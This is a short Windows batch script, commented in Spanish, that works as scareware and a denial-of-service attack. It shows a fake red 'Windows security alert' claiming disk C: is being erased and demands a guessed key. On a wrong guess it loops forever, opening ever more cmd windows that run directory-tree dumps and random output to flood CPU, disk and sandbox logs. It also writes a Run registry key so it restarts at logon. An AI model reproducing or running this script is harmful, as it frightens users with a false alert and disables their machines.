@echo off
:: [RULETA RUSA ALEATORIA]
set /a "master_key=%random% %% 9 + 1"

title CRITICAL SYSTEM FAILURE
color 0c
cls
echo ======================================================
echo           ALERTA DE SEGURIDAD DE WINDOWS
echo ======================================================
echo.
echo Se ha detectado un intento de borrado del disco C:\
echo Para CANCELAR, introduce la llave de seguridad (1-9).
echo Solo tienes 1 intento. Si fallas, el proceso sera irreversible.
echo.
set /p "user_input=LLAVE DE EMERGENCIA: "

if "%user_input%"=="%master_key%" (
    echo.
    echo [+] Acceso concedido. El sistema se ha salvado...
    timeout /t 5 >nul
    exit
) else (
    echo.
    echo [-] LLAVE %user_input% INCORRECTA. ERA LA %master_key%.
    echo [-] INICIANDO COLAPSO TOTAL...
    :: Reducimos el tiempo de espera para que no dé tiempo a cerrar la ventana
    timeout /t 1 /nobreak >nul
)

:: [PAYLOAD: EL DESTRUCTOR DE SANDBOXES]
:V10_SUPREME
:: Lanzamos dos tipos de procesos sin parar
:: 1. El 'tree' consume disco y genera miles de líneas de log (esto tumba el reporte)
start cmd /c "color 0a & tree c:\ /f"
:: 2. El 'random' consume CPU al 100% y llena la pantalla de ventanas visuales
start cmd /c "color 0c & title ERROR_%random% & echo %random%%random%%random% & pause"
:: [PERSISTENCIA] Aseguramos que si la MV sobrevive al reinicio, vuelva a empezar
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemCrash" /t REG_SZ /d "%~f0" /f
:: Bucle infinito sin 'timeout' para maximizar la velocidad de ataque
goto V10_SUPREME
